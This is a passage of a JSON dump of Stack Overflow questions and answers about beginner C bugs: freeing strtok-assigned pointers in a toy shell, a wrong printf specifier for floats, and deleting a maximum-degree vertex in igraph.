and instead commented <i>&quot;Hey, this thing you&#39;re creating isn&#39;t a 2D array - it&#39;s an array of pointers to allocations. You should call it that.&quot;</i> -- I apologize if I misinterpreted your comment, I just didn&#39;t want to further confuse this guy."}, {"owner": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459378358, "post_id": 36320994, "comment_id": 60265546, "body": "@JonathonReinhart, if I just allocate and free, it terminated successfully. What is happening between is the assignment to args[0] to args[n] using strtok to break up the <code>ls -a -l</code> block."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459378459, "post_id": 36320994, "comment_id": 60265584, "body": "@Jackobyte Ok. Time to track down the memory corruption in the <i>rest</i> of your code, which you haven&#39;t shown here.  Like we&#39;ve said - the 80 is suspicious; I suspect the code writing to it is as well. I would re-write it to not allocate a fixed 80 bytes. Use <code>strdup</code> if you must copy the strings to newly allocated memory.  Otherwise, fire up <code>valgrind</code> to track down the corruption."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459378463, "post_id": 36320994, "comment_id": 60265585, "body": "That&#39;s as I suppose most of us expected.  Chances are that you are double-freeing a pointer, or that you are corrupting the memory manager&#39;s data structures by overrunning the bounds of one of your objects."}, {"owner": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1459378597, "post_id": 36320994, "comment_id": 60265633, "body": "@MartinJames, I just used 80 as it seemed like a reasonable length to allocate an argument as. I&#39;m trying to emulate a bash-like shell and personally haven&#39;t had much use for an argument longer than 80 characters."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459378738, "post_id": 36320994, "comment_id": 60265679, "body": "@JonathonReinhart: Sorry, I just had this discussion in another thread, not to mention the many other days. So, what&#39;s wrong with that? I just tell him this is no 2D array, so he should not call it like that. Just because there is no nice, short name for this kind of construct does not justify calling it 2D array. Maybe we should start a naming contest for this recurring (and very well usable) construct? What he actually should use depends on the rest of the code (<a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>?)."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459378891, "post_id": 36320994, "comment_id": 60265733, "body": "&quot;personally haven&#39;t had much use for an argument longer than 80 characters&quot; - You might be surprised what the shell-scripts your system uses under the hood might pass as arguments. If that&#39;s what you are up to, you need quite a different approach."}, {"owner": {"reputation": 8173, "user_id": 3299580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5442c85b57162abfc606d86c0083e1d?s=128&d=identicon&r=PG&f=1", "display_name": "The Dark", "link": "https://stackoverflow.com/users/3299580/the-dark"}, "edited": false, "score": 2, "creation_date": 1459379259, "post_id": 36320994, "comment_id": 60265860, "body": "You said &quot;assignment to args[0] to args[n] using strtok&quot;, are you just assigning the return value of <code>strtok</code> to your <code>arg[i]</code>? If so, you are throwing away the allocated pointer and replacing it with a pointer into the original string. You will then have a problem with <code>free</code> as you haven&#39;t <code>malloc</code>ed those pointers. Use <code>strcpy</code> instead. This is why it is important to show the right amount of code in your posts."}, {"owner": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "edited": false, "score": 0, "creation_date": 1459379269, "post_id": 36320994, "comment_id": 60265867, "body": "I have traced my problem to a function called between the allocation and freeing of the memory. The function <code>breakargs(cmd, args);</code> takes the complete line given in by the user and breaks it up using strtok, populating args with each component. I will attach breakargs function to my original post."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459379298, "post_id": 36320994, "comment_id": 60265877, "body": "@Jackobyte Post that code. What you have now is not an <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459380044, "post_id": 36320994, "comment_id": 60266109, "body": "Re edit: you allocate memory for <code>tok</code> then overwrite it with the result of <code>strtok</code>. You then try to <code>free(tok)</code> but it was not the pointer returned by <code>malloc</code>"}, {"owner": {"reputation": 8727, "user_id": 2999346, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dQ1wB.png?s=128&g=1", "display_name": "francis", "link": "https://stackoverflow.com/users/2999346/francis"}, "reply_to_user": {"reputation": 8173, "user_id": 3299580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5442c85b57162abfc606d86c0083e1d?s=128&d=identicon&r=PG&f=1", "display_name": "The Dark", "link": "https://stackoverflow.com/users/3299580/the-dark"}, "edited": false, "score": 0, "creation_date": 1459380121, "post_id": 36320994, "comment_id": 60266138, "body": "@The Dark has spotted the right answer : just use <code>strcpy(args[0], tok)</code> instead of <code>args[0] = tok</code>. The latter just modifies the pointer, thus creating memory leaks and failure as <code>free()</code> is called. Same thing for <code>args[i] = tok</code> and <code>args[i] = &#39;\\0&#39;;</code>. Moreover, <code>&#39;\\0&#39;</code> is a char, not a char*..."}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 1, "last_activity_date": 1459382708, "last_edit_date": 1459382708, "creation_date": 1459380097, "answer_id": 36321475, "question_id": 36320994, "link": "https://stackoverflow.com/questions/36320994/freeing-a-2d-array-of-mallocd-strings-fails-in-c/36321475#36321475", "title": "Freeing a 2D array of malloc&#39;d strings fails in C", "body": "<p>The problem isn't in the code you show; it is in the code you don't show.  Without having read the complete comment chain, I suspect you're doing something similar to this:</p>\n\n<pre><code> args[0] = \"ls\";\n args[1] = \"-a\";\n args[2] = \"-l\";\n args[3] = NULL;\n</code></pre>\n\n<p>and then trying to free the <code>args</code> array.  Maybe your code was not quite so blatant, but the net result may be much the same.  For example, you could have split up a command line that was read into a buffer and might copy the pointers to sections of the buffer into the <code>args</code> array elements. (<em>Update:</em> This <a href=\"https://stackoverflow.com/questions/36320994/freeing-a-2d-array-of-mallocd-strings-fails-in-c/36321475#comment60265867_36320994\">seems</a> to be the actual problem.)</p>\n\n<p>This has obliterated the allocated memory (you've lost it \u2014 you've leaked memory), and later you're trying to free unallocated memory (pointers that were not returned by <code>malloc()</code> or one of its friends).  The first such <code>free()</code> often 'works', but completely messes up the controls used by <code>malloc()</code> et al so that the second <code>free()</code> fails.  Many, but not all, modern systems sport a <code>malloc()</code> that detects many such abuses.</p>\n\n<p>You need code more like:</p>\n\n<pre><code>strcpy(args[0], \"ls\");\nstrcpy(args[1], \"-a\");\nstrcpy(args[2], \"-l\");\nfree(args[3]);\nargs[3] = NULL;\n</code></pre>\n\n<p>Note that allocating 80 bytes per string was a gross over-allocation for these strings.  OTOH, it could also be completely inadequate for other (longer) arguments.  You should allocate the memory for <code>args</code> itself as you did; you should probably allocate the memory for the individual elements according to what the corresponding argument contains.  There's a (POSIX but not Standard C) function called <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/strdup.html\" rel=\"nofollow\"><code>strdup()</code></a> that might be what you're looking for \u2014 it allocates enough space for a copy of a string and copies the string into the allocated space.  Alternatively, you might not need the allocations at all.</p>\n\n<p>If it is available for your platform, you should use <a href=\"http://valgrind.org/\" rel=\"nofollow\"><code>valgrind</code></a> to validate your memory use and identify your abuses.</p>\n"}, {"comments": [{"owner": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "edited": false, "score": 0, "creation_date": 1459381551, "post_id": 36321524, "comment_id": 60266620, "body": "These steps have fixed nearly all my problems.  The only one remaining is that I need the last value in args to be NULL as execvp looks for a NULL terminator in the accepted arguments. Strcpy&#39;ing over an empty string causes the <code>ls</code> command to look for a file named &quot;&quot; so is an insufficient solution.  If I assign it manually as I have above, <code>args[i]=&#39;\\0&#39;</code>, the program seems to work, including the successful freeing of args[3]. Is it silently failing behind the scenes though?"}, {"owner": {"reputation": 8173, "user_id": 3299580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5442c85b57162abfc606d86c0083e1d?s=128&d=identicon&r=PG&f=1", "display_name": "The Dark", "link": "https://stackoverflow.com/users/3299580/the-dark"}, "reply_to_user": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "edited": false, "score": 1, "creation_date": 1459382440, "post_id": 36321524, "comment_id": 60266896, "body": "In this case <code>&#39;\\0&#39;</code> is being treated as <code>0</code> which is the same as <code>NULL</code>. What is happening is that you are leaking the memory that was allocated for the last <code>argv[i]</code> as you have lost what the pointer was. To fix this, you could <code>free(argv[i])</code> before saying <code>argv[i]=NULL</code> (use NULL as it is clearer then &#39;\\0&#39;). That would free the memory, but it would leave you with the odd situation where the caller has to allocate memory for the array elements that may or may no be freed. It would be better to change your <code>breakArgs</code> function to do the <code>malloc</code> of the all array elements itself."}, {"owner": {"reputation": 8173, "user_id": 3299580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5442c85b57162abfc606d86c0083e1d?s=128&d=identicon&r=PG&f=1", "display_name": "The Dark", "link": "https://stackoverflow.com/users/3299580/the-dark"}, "reply_to_user": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "edited": false, "score": 0, "creation_date": 1459382513, "post_id": 36321524, "comment_id": 60266924, "body": "As some of the other commenters have said - you could use strdup to allocate and copy the string from <code>tok</code>, then you wouldn&#39;t need to pre-allocate the arr entries."}, {"owner": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "edited": false, "score": 0, "creation_date": 1459383160, "post_id": 36321524, "comment_id": 60267121, "body": "I have now moved where I allocate args[i] into the breakArgs function so that the size of each matches the length of the relevant argument, <code>args[i] = malloc(strlen(tok) * sizeof(char));</code> before then using strcpy to move the argument into this memory location. In this way, the first definition of the last arg[i] is in the line <code>args[i]=NULL;</code>, and I don&#39;t need to mess with freeing it before assigning to it."}, {"owner": {"reputation": 8173, "user_id": 3299580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5442c85b57162abfc606d86c0083e1d?s=128&d=identicon&r=PG&f=1", "display_name": "The Dark", "link": "https://stackoverflow.com/users/3299580/the-dark"}, "reply_to_user": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "edited": false, "score": 0, "creation_date": 1459383534, "post_id": 36321524, "comment_id": 60267242, "body": "Should be <code>malloc((strlen(tok)+1) * sizeof(char));</code> - don&#39;t forget those null terminator bytes at the end of strings. Alternatively <code>args[i] = strdup(tok)</code> would be simpler, then you don&#39;t need the strcpy."}], "tags": [], "owner": {"reputation": 8173, "user_id": 3299580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5442c85b57162abfc606d86c0083e1d?s=128&d=identicon&r=PG&f=1", "display_name": "The Dark", "link": "https://stackoverflow.com/users/3299580/the-dark"}, "is_accepted": true, "score": 1, "last_activity_date": 1459380369, "creation_date": 1459380369, "answer_id": 36321524, "question_id": 36320994, "link": "https://stackoverflow.com/questions/36320994/freeing-a-2d-array-of-mallocd-strings-fails-in-c/36321524#36321524", "title": "Freeing a 2D array of malloc&#39;d strings fails in C", "body": "<p><code>strtok</code> returns a pointer into the string that was initially passed to <code>strtok</code>, there is no need to allocate space for that pointer.</p>\n\n<p>When you assign the return value of <code>strtok</code> to a pointer variable, you overwrite that variable's pointer value with the new value. This means, if that pointer variable points to memory you have already allocated, that memory will be \"leaked\" as you no longer have a pointer to it.</p>\n\n<p>In short - if you allocate memory for a pointer variable, don't assign a different value to that pointer variable unless you have already <code>free</code>d the memory or put the pointer value somewhere else.</p>\n\n<p>In your <code>breakArgs</code> function there are a number of issues:</p>\n\n<pre><code>void breakargs(char * cmd, char ** args) {\n    char * tok = malloc(strlen(cmd)*sizeof(char)); //maximum token size is full cmd\n</code></pre>\n\n<p>You don't need to allocate memory for <code>tok</code> as you will assigning it a value from <code>strtok</code></p>\n\n<pre><code>    char * str = malloc(strlen(cmd)*sizeof(char));\n    int i=1;\n    strcpy(str, cmd); //maintains integrity of cmd\n\n    args[0] = tok = strtok(str, \" \");\n</code></pre>\n\n<p>Don't assign directly into <code>args[0]</code> as that will overwrite the pointer to the memory you already allocated. Instead assign into <code>tok</code>, then <code>strcpy(args[0], tok</code>);</p>\n\n<pre><code>    while (tok != NULL)\n    {\n        args[i] = tok = strtok(NULL, \" \");\n</code></pre>\n\n<p>Don't assign directly into <code>args[i]</code> as that will overwrite the pointer to the memory you already allocated. Instead assign into <code>tok</code>, then <code>strcpy(args[i], tok</code>);\nYou should also check for <code>tok</code> being NULL before you <code>strcpy</code> from it.</p>\n\n<pre><code>        i++;\n    }\n    args[i] = '\\0';\n</code></pre>\n\n<p>Don't assign directly into args[i], instead you could indicate the end by <code>strcpy(args[i], \"\")</code> so you have a blank string at the end.</p>\n\n<pre><code>    free(tok);\n</code></pre>\n\n<p>Don't free <code>tok</code> here, as <code>tok</code> should be NULL by this stage, you do need to <code>free (str)</code> though.</p>\n\n<pre><code>}\n</code></pre>\n\n<p>Also take note of some of the other comments about checking that the arguments you process don't exceed the limit you have put on the memory (e.g. 80 characters per item).</p>\n"}], "owner": {"reputation": 23, "user_id": 1956566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283a2117aafe4e70db11849dcb046ed8?s=128&d=identicon&r=PG", "display_name": "Jackobyte", "link": "https://stackoverflow.com/users/1956566/jackobyte"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 449, "favorite_count": 1, "accepted_answer_id": 36321524, "answer_count": 2, "score": 1, "last_activity_date": 1459383465, "creation_date": 1459377521, "last_edit_date": 1459383465, "question_id": 36320994, "link": "https://stackoverflow.com/questions/36320994/freeing-a-2d-array-of-mallocd-strings-fails-in-c", "title": "Freeing a 2D array of malloc&#39;d strings fails in C", "body": "<p>I know this is a question that has been asked quite frequently but I have read 10+ closed questions without any luck as my solution seems to match those proposed as solutions by others.</p>\n\n<p>I am writing my own shell as a learning exercise and in doing so, I am malloc'ing an array of strings to serve as the arguments of a program call. My malloc is done as follows where argcnt is the number of arguments given + 2 to match the standard argv size and allow the array to be null terminated and thus used by execvp:</p>\n\n<pre><code>char ** args;\nargs = (char **) malloc(argcnt*sizeof(char *));\nfor(i = 0; i &lt; argcnt; i++) {\n    args[i] = (char *) malloc(80*sizeof(char));\n    printf(\"Made %d\\n\", i);\n}\n</code></pre>\n\n<p>I then free the same memory as follows:</p>\n\n<pre><code>for (i = 0; i &lt; argcnt; i++) {\n    free(args[i]);\n    printf(\"Freed %d\\n\", i);\n}\nfree(args);\n</code></pre>\n\n<p>The program compiles but fails at freeing argv[1] at runtime. The sample output of running the program and then calling <code>ls -a -l</code> is as follows:</p>\n\n<pre><code>jack@ubuntu:~/myshell$ ./myshell \n[30/03 23:34] # ls -a -l\nArgcnt: 4\nMade 0\nMade 1\nMade 2\nMade 3\nArg[0]: ls\nArg[1]: -a\nArg[2]: -l\nArg[3]: (null)\nFreed 0\n*** Error in `./myshell': free(): invalid pointer: 0x0000000001a84c43 ***\nAborted (core dumped)\n</code></pre>\n\n<p>I have been wrestling with this for the last 2 hours and can't work out what is wrong so some insight into the problem would be very much appreciated. </p>\n\n<p>EDIT:\nThe function currently breaking my program is:</p>\n\n<pre><code>void breakargs(char * cmd, char ** args) {\n    char * tok = malloc(strlen(cmd)*sizeof(char)); //maximum token size is full cmd\n    char * str = malloc(strlen(cmd)*sizeof(char));\n    int i=1;\n    strcpy(str, cmd); //maintains integrity of cmd\n\n    args[0] = tok = strtok(str, \" \");\n    while (tok != NULL)\n    {\n        args[i] = tok = strtok(NULL, \" \");\n        i++;\n    }\n    args[i] = '\\0';\n    free(tok);\n}\n</code></pre>\n\n<p>2nd EDIT: The problem was my reassigning of the pointers made by my original malloc with strtok so that the original pointer reference was lost. Furthermore, my use of a definite string length for arguments could potentially lead to problems. The solution was to only malloc args[i] when I knew the length of the string that needs to be stored there, and then move the string into that memory location using strcpy instead of direct assignment as I had been doing. This maintains the integrity of the pointer reference and allows it to be freed correctly. </p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1459376289, "post_id": 36320689, "comment_id": 60264781, "body": "<code>printf(&quot;\\n-------------------------\\nCodigo: %s\\nDescricao: %s\\nQuantidade: %d\\nPreco de Custo: %d\\nPreco de Venda: %d&quot;, estoque[i].codigo, estoque[i].descricao, estoque[i].quantidade, estoque[i].precoCusto, estoque[i].precoVenda)</code>. Wrong format specifier used for <code>float</code>."}, {"owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "edited": false, "score": 0, "creation_date": 1459376899, "post_id": 36320689, "comment_id": 60265020, "body": "And BTW, not testing the return value from <code>scanf()</code> is always a recipe for surprises. Plus, it&#39;s <code>int main</code>, not <code>void main</code> in C."}, {"owner": {"reputation": 11, "user_id": 4343089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e0a4dc0ad6ff284547053c37317d42d?s=128&d=identicon&r=PG&f=1", "display_name": "DimplyKhan13", "link": "https://stackoverflow.com/users/4343089/dimplykhan13"}, "edited": false, "score": 0, "creation_date": 1459377173, "post_id": 36320689, "comment_id": 60265121, "body": "Thank you, but I&#39;m only beginning, the teacher says that we don&#39;t need to worry about it yet. And about the main, I\u2019ll change."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 4343089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e0a4dc0ad6ff284547053c37317d42d?s=128&d=identicon&r=PG&f=1", "display_name": "DimplyKhan13", "link": "https://stackoverflow.com/users/4343089/dimplykhan13"}, "edited": false, "score": 0, "creation_date": 1459377029, "post_id": 36320777, "comment_id": 60265069, "body": "Yes, Thank you, it solved, but now the number appears like 12.299999, when i enter 12.3. Can i fix on only 2 digits after the dot?"}, {"owner": {"reputation": 8201, "user_id": 3690024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e2d5067f52318f0ed4db9eca0b2cda1?s=128&d=identicon&r=PG", "display_name": "AJNeufeld", "link": "https://stackoverflow.com/users/3690024/ajneufeld"}, "reply_to_user": {"reputation": 11, "user_id": 4343089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e0a4dc0ad6ff284547053c37317d42d?s=128&d=identicon&r=PG&f=1", "display_name": "DimplyKhan13", "link": "https://stackoverflow.com/users/4343089/dimplykhan13"}, "edited": false, "score": 0, "creation_date": 1459377109, "post_id": 36320777, "comment_id": 60265096, "body": "That really is a different question, and should be posted as such.  But, briefly, <code>%.2f</code>"}], "tags": [], "owner": {"reputation": 8201, "user_id": 3690024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e2d5067f52318f0ed4db9eca0b2cda1?s=128&d=identicon&r=PG", "display_name": "AJNeufeld", "link": "https://stackoverflow.com/users/3690024/ajneufeld"}, "is_accepted": true, "score": 0, "last_activity_date": 1459376485, "creation_date": 1459376485, "answer_id": 36320777, "question_id": 36320689, "link": "https://stackoverflow.com/questions/36320689/scanf-not-working-need-to-read-float-keep-then-read-it/36320777#36320777", "title": "scanf not working. Need to read float, keep, then read it", "body": "<p>%f is needed to print the float values, not %d</p>\n\n<p>Change:</p>\n\n<pre><code>printf(\"...Preco de Custo: %d\\nPreco de Venda: %d\"...);\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>printf(\"...Preco de Custo: %f\\nPreco de Venda: %f\"...);\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4343089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e0a4dc0ad6ff284547053c37317d42d?s=128&d=identicon&r=PG&f=1", "display_name": "DimplyKhan13", "link": "https://stackoverflow.com/users/4343089/dimplykhan13"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "accepted_answer_id": 36320777, "answer_count": 1, "score": 0, "last_activity_date": 1459376485, "creation_date": 1459376038, "question_id": 36320689, "link": "https://stackoverflow.com/questions/36320689/scanf-not-working-need-to-read-float-keep-then-read-it", "title": "scanf not working. Need to read float, keep, then read it", "body": "<p>I'm making a code to acquire some information, make a \"struct\", and then list them.</p>\n\n<p>I can add all the information I want, but when i read them, the float values are wrong.\nI can't see to find if I'm making a mistake on the code, or using any code wrong.</p>\n\n<p>It\u2019s not complete, I still need to add a couple more features, and my menu is not working well, so don\u2019t mind about it.</p>\n\n<p>In menu 1 only 1 is working, and on menu 2, 1 is for Include, 2 for List and 3 for Exclude.</p>\n\n<p>Here is some parts of the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define ESTOQUEtamanho 10\n\nstruct PRODUTO {\n    char codigo[20];\n    char descricao[100];\n    int quantidade;\n    float precoCusto;\n    float precoVenda;\n    char livre;\n};\n\nstruct PRODUTO estoque[ESTOQUEtamanho];\n\n\n\nvoid inicializa(){\n    int i;\n    for (i=0;i&lt;ESTOQUEtamanho;i++)\n        estoque[i].livre=1;\n}\nint insereEstoque (char *c, char *d, int q, float pC, float pV){\n    int i;\n    for (i=0;i&lt;ESTOQUEtamanho;i++) {\n        if (estoque[i].livre) {\n           strcpy(estoque[i].codigo, c);\n           strcpy(estoque[i].descricao, d);\n           estoque[i].quantidade = q;\n           estoque[i].precoCusto = pC;\n           estoque[i].precoVenda = pV;\n           estoque[i].livre=0;\n           return(1);\n        }\n    }\n    return(0);\n}\nvoid listarEstoque(){\n    int i;\n    for (i=0;i&lt;ESTOQUEtamanho;i++)\n       if (!estoque[i].livre)\n             printf(\"\\n-------------------------\\nCodigo: %s\\nDescricao: %s\\nQuantidade: %d\\nPreco de Custo: %d\\nPreco de Venda: %d\", estoque[i].codigo, estoque[i].descricao, estoque[i].quantidade, estoque[i].precoCusto, estoque[i].precoVenda);\n}\nint excluirEstoque (char *c){\n    int i;\n    for (i=0;i&lt;ESTOQUEtamanho;i++){\n        if(!estoque[i].livre)\n            if(!strcmp(c, estoque[i].codigo)){\n                estoque[i].livre = 1;\n                return(1);\n            }\n    }\n    return(0);\n}\n\nvoid main(){\n\n\n    int opc1, opcEstoque;\n\n    char codigo[20], descricao[100];\n    int quantidade;\n    float precoCusto, precoVenda;\n\n    inicializa();\n\n    while (1) {\n        printf(\"\\n-------------------------------\\nControle de Estoque\\n\\tOpcoes:\\n\\t1-Estoque\\n\\t2-Cliente\\n\\t3-Vendedor\\n\\t4-Venda\\n\\nEntre com sua opcao: \");\n        opc1=getchar();getchar();\n        switch (opc1) {\n            case '1': printf(\"\\n-------------------------------\\nEstoque\\n\\tOpcoes:\\n\\t1-Incluir\\n\\t2-Listar\\n\\t3-Excluir\\n\\t0-Voltar\\n\\nEntre com sua opcao:\");\n                opcEstoque=getchar();getchar();\n                switch (opcEstoque) {    printf(\"\\nEntre com o nome: \");\n                    case '1':printf(\"\\nEntre com o codigo: \");\n                        gets(codigo);\n                        printf(\"\\nEntre com a descricao: \");\n                        gets(descricao);\n                        printf(\"\\nEntre com a quantidade: \");\n                        scanf(\"%d\", &amp;quantidade);\n                        printf(\"\\nEntre com o preco de custo: \");\n                        scanf(\"%f\", &amp;precoCusto);\n                        printf(\"\\nEntre com preco de venda: \");\n                        scanf(\"%f\", &amp;precoVenda);\n                        if (insereEstoque (codigo, descricao, quantidade, precoCusto, precoVenda)) printf(\"\\nProduto Incluso\");\n                        else printf(\"\\nFalha na inclusao\");\n                        break;\n                    case '2': listarEstoque();\n                        break;\n                    case '3': printf(\"\\nEntre com o codigo para excluir: \");\n                        gets(codigo);\n                        if (excluirEstoque (codigo)) printf(\"\\nProduto Excluido\");\n                        else printf(\"\\nFalha na exclusao\");\n                        break;\n                    default: printf(\"\\nOp\u00c3\u00a7\u00c3\u00a3o n\u00c3\u00a3o implementada! \");\n                        break;\n                }break;\n        }\n    }\n}`\n</code></pre>\n"}, {"tags": ["c", "igraph"], "answers": [{"comments": [{"owner": {"reputation": 4265, "user_id": 1208142, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vfF38.jpg?s=128&g=1", "display_name": "Lucien S.", "link": "https://stackoverflow.com/users/1208142/lucien-s"}, "edited": false, "score": 0, "creation_date": 1459536824, "post_id": 36356709, "comment_id": 60346983, "body": "This is great! I should have been clearer in my question though. I actually need to remove only one of the highest degree vertices, randomly selected (or the first one in the ordered vector of degree)..."}], "tags": [], "owner": {"reputation": 43955, "user_id": 156771, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2163ccb26148ab885d6d827e7cb270a1?s=128&d=identicon&r=PG", "display_name": "Tam&#225;s", "link": "https://stackoverflow.com/users/156771/tam%c3%a1s"}, "is_accepted": false, "score": 1, "last_activity_date": 1459514700, "creation_date": 1459514700, "answer_id": 36356709, "question_id": 36320610, "link": "https://stackoverflow.com/questions/36320610/delete-the-vertex-of-maximum-degree-in-a-igraph-graph-in-c/36356709#36356709", "title": "Delete the vertex of maximum degree in a iGraph graph in C", "body": "<p>There could be multiple vertices with the degree equal to the maximum degree, so you have to query all the degrees with <code>igraph_degree()</code> (just like you did), find the items in the vector that are equal to the maximum you have obtained earlier from <code>igraph_maxdegree()</code>, collect the indices of these items into a vector, and then pass that to <code>igraph_delete_vertices()</code>, wrapped into an <code>igraph_vs_t</code>. Something like:</p>\n\n<pre><code>igraph_vector_t indices;\nlong int i;\nigraph_integer_t vcount = igraph_vcount(&amp;graph);\n\nigraph_vector_init(&amp;indices, 0);\nfor (i = 0; i &lt; vcount; i++) {\n    if (VECTOR(degree)[i] == mdeg) {\n        igraph_vector_push_back(&amp;indices, i);\n    }\n}\n\nigraph_delete_vertices(&amp;g, igraph_vss_vector(&amp;indices));\n</code></pre>\n"}], "owner": {"reputation": 4265, "user_id": 1208142, 